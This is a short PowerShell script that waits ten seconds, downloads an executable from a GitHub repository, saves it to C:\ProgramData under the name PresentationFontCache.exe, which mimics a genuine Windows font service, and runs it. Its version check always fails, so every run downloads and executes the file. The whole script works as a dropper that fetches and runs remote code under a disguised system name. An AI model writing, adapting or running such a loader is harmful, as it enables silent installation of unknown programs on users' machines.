Start-Sleep -s 10
# Set the TLS protocol version
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URL
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$url_exe = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
$file_exe = "C:\ProgramData\PresentationFontCache.exe"

# Check if the version file exists
if (Test-Path $url_text) {
    Write-Host "version text found"
    # Check if the exe file exists
    if (Test-Path $file_exe) {
        # Run the exe file
        Start-Process -FilePath $file_exe
    } else {
        # Download the exe file
        try {
            $down = New-Object System.Net.WebClient
            $down.DownloadFile($url_exe,$file_exe)
            # Run the exe file
            Start-Process -FilePath $file_exe
        }
        catch {
            Write-Host "Error downloading the file: $_.Exception.Message"
        }
    }
} else {
    Write-Host "No version text"
    # Updated the exe file
    try {
        $down = New-Object System.Net.WebClient
        $down.DownloadFile($url_exe,$file_exe)
        # Run the exe file
        Start-Process -FilePath $file_exe
    }
    catch {
        Write-Host "Error downloading the file: $_.Exception.Message"
    }
}

# Exit the script
exit
